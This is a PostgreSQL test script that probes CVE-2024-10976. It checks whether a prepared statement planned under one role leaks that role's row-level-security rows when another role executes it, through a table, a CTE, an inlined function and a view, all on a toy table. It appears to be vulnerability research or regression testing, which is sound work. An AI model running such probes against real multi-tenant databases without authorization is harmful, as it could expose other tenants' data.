-- 09_plancache_role.sql
-- Hypothesis (class 1 / CVE-2024-10976): a prepared statement planned under
-- role A and executed under role B reuses A's RLS policy when the RLS table is
-- reached only through a nested path (CTE, inlined SQL function, view).
-- force_generic_plan makes the reused generic plan the dangerous case.
\set ON_ERROR_STOP 0
DROP TABLE IF EXISTS t CASCADE;
DROP ROLE IF EXISTS alice, bob;
DROP FUNCTION IF EXISTS getrows();
DROP VIEW IF EXISTS v;
CREATE ROLE alice LOGIN;
CREATE ROLE bob LOGIN;

CREATE TABLE t (id int, tenant text, secret text);
INSERT INTO t VALUES (1,'alice','A-secret'), (2,'bob','B-secret');
ALTER TABLE t ENABLE ROW LEVEL SECURITY;
ALTER TABLE t FORCE ROW LEVEL SECURITY;
CREATE POLICY p ON t USING (tenant = current_user);
GRANT SELECT ON t TO alice, bob;

-- FROM-clause SQL function (candidate for inlining) referencing the RLS table
CREATE FUNCTION getrows() RETURNS SETOF t AS 'SELECT * FROM t' LANGUAGE sql STABLE;
GRANT EXECUTE ON FUNCTION getrows() TO alice, bob;
-- security_invoker view over the RLS table
CREATE VIEW v WITH (security_invoker=true) AS SELECT * FROM t;
GRANT SELECT ON v TO alice, bob;

SET plan_cache_mode = force_generic_plan;

\echo '########## (a) direct table, prepared under alice, executed under bob ##########'
SET ROLE alice;
PREPARE sa AS SELECT tenant, secret FROM t ORDER BY id;
\echo '-- alice EXECUTE (expect only alice row):'
EXECUTE sa;
SET ROLE bob;
\echo '-- bob EXECUTE same prepared stmt (expect only bob row, NOT alice):'
EXECUTE sa;
RESET ROLE;
DEALLOCATE sa;

\echo '########## (b) via CTE, prepared under alice, executed under bob ##########'
SET ROLE alice;
PREPARE sb AS WITH c AS (SELECT * FROM t) SELECT tenant, secret FROM c ORDER BY id;
EXECUTE sb;
SET ROLE bob;
\echo '-- bob (expect only bob row):'
EXECUTE sb;
RESET ROLE;
DEALLOCATE sb;

\echo '########## (c) via inlined FROM function, prepared under alice, executed under bob ##########'
SET ROLE alice;
PREPARE sc AS SELECT tenant, secret FROM getrows() ORDER BY id;
EXECUTE sc;
SET ROLE bob;
\echo '-- bob (expect only bob row):'
EXECUTE sc;
RESET ROLE;
DEALLOCATE sc;

\echo '########## (d) via security_invoker view, prepared under alice, executed under bob ##########'
SET ROLE alice;
PREPARE sd AS SELECT tenant, secret FROM v ORDER BY id;
EXECUTE sd;
SET ROLE bob;
\echo '-- bob (expect only bob row):'
EXECUTE sd;
RESET ROLE;
DEALLOCATE sd;
